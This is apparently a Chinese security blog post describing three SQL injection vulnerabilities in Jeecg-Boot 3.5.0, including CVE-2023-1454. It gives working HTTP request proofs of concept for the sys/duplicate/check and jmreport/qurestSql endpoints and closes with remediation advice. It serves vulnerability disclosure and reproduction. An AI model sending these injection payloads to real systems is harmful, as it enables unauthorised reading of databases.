#  Jeegc-Boot 最新多个SQL注入漏洞

原创 Hack All [ Hack All ](javascript:void\(0\);)

**Hack All** ![]()

微信号 PTIOVHA

功能介绍 专注于网络安全，渗透测试，文章和工具分享，包括但不限于Web安全、物联网安全、车联网安全，我们的目标是Hack All！

____

___发表于_

收录于合集

#漏洞库 25 个

#漏洞复现 13 个

#漏洞知识 12 个

![](https://gitee.com/fuli009/images/raw/master/public/20230619143321.png)

**简介**  

Jeecg-Boot是一款基于Spring Boot和Jeecg-Boot-
Plus的快速开发平台，它提供了一系列的代码生成器、模板引擎、权限管理、数据字典、数据导入导出等功能，可以帮助开发者快速构建企业级应用。最近在最新的jeecg-
boot 3.5.0 中被爆出多个SQL注入漏洞。

官方网站：http://www.jeecg.com

 **影响范围**

Jeecg-Boot = v3.5.0

 **1、** **sys/duplicate/check 接口SQL注入**

sys/duplicate/check 接口存在SQL注入漏洞，checksql可以被绕过，需要身份认证，判断当前数据库用户：

![](https://gitee.com/fuli009/images/raw/master/public/20230619143323.png)

![]()

来源：

  * 

    
    
    https://github.com/jeecgboot/jeecg-boot/issues/4737

Poc：

  *   *   *   *   *   *   *   *   * 

    
    
    GET /jeecg-boot/sys/duplicate/check?tableName=v3_hello&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(0))&fieldVal=1&dataId=asd HTTP/1.1Host: 127.0.0.1:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36Connection: closeCache-Control: max-age=0X_ACCESS_TOKEN: [Token值]

 **2、jmreport/qurestSql 未授权SQL注入(CVE-2023-1454)**

根据J0hnWalker的分析，漏洞产生的主要原因是jimureport-spring-boot-
starter-1.5.6.jar中/org/jeecg/modules/jmreport/desreport/a/a.class文件：

![](https://gitee.com/fuli009/images/raw/master/public/20230619143324.png)

参数 apiSelectId 会从jimu_report_db表中通过id参数查询数据，id参数未过滤：

![](https://gitee.com/fuli009/images/raw/master/public/20230619143325.png)

jimu_report_db表中id值为1272834687525482497和1290104038414721025等的db_dyn_sql列是sql语句，且引用了id参数，这会导致二次注入：

![](https://gitee.com/fuli009/images/raw/master/public/20230619143326.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230619143328.png)

Poc：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /jeecg-boot/jmreport/qurestSql HTTP/1.1Host: localhost:8080Cache-Control: max-age=0sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "macOS"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6Connection: closeContent-Length: 130Content-Type: application/json;charset=UTF-8  
    {"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}

获取当前数据库用户：

![](https://gitee.com/fuli009/images/raw/master/public/20230619143329.png)

来源：  

  * 

    
    
    https://github.com/J0hnWalker/jeecg-boot-sqli

 **3、jmreport/loadTableData授权SQL注入**

可视化设计-->报表设计器功能处存在SQL注入：  

![](https://gitee.com/fuli009/images/raw/master/public/20230619143330.png)

通过新建报表添加SQL数据集：

![](https://gitee.com/fuli009/images/raw/master/public/20230619143331.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230619143332.png)

在报表SQL中插入SQL语句，在数据预览时触发SQL注入：  

![](https://gitee.com/fuli009/images/raw/master/public/20230619143333.png)

来源：

  * 

    
    
    https://github.com/jeecgboot/jeecg-boot/issues/4702

 **修复建议**  

1、目前官方暂未发布安全版本修复该漏洞，请及时关注官网最新版本的发布情况。2、设置访问IP白名单或将系统部署到内网环境中。3、修改漏洞代码，过滤id参数，防止SQL注入。

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

